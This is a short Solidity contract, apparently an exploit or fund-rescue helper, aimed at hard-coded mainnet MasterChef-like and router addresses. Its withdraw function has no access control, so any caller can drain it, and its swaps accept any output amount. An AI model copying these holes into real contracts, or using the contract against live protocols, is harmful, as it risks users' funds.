pragma solidity 0.8.16;

import "./UniswapV2Like.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface MasterChefLike {
    function poolInfo(uint256 id) external returns (
        address lpToken,
        uint256 allocPoint,
        uint256 lastRewardBlock,
        uint256 accSushiPerShare
    );
    function poolLength() external view returns (uint256);
    function add(
        uint256 _allocPoint,
        IERC20 _lpToken,
        bool _withUpdate
    ) external;
}

contract ExploitRescue {
  address public lpToken;
  address public tokenOut0;
  address public tokenOut1;

  MasterChefLike public constant masterchef = MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);
  UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

  function getPool(uint256 _poolId) external {
    (lpToken,,,) = masterchef.poolInfo(_poolId);
    tokenOut0 = UniswapV2PairLike(lpToken).token0();
    tokenOut1 = UniswapV2PairLike(lpToken).token1();
  }

  function poolLength() external view returns (uint256) {
    return masterchef.poolLength();
  }

  function addPool(address _lpToken) external {
    masterchef.add(0,IERC20(_lpToken),true);
  }

  function swap(address tokenIn, address tokenOut, uint256 amountIn) external {
    IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
    IERC20(tokenIn).approve(address(router), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = tokenIn;
    path[1] = tokenOut;
    router.swapExactTokensForTokens(
        amountIn,
        0,
        path,
        address(this),
        block.timestamp
    );
  }

  function withdraw(address tokenOut) external {
    uint256 bal = IERC20(tokenOut).balanceOf(address(this));
    IERC20(tokenOut).transfer(msg.sender, bal);
  }
}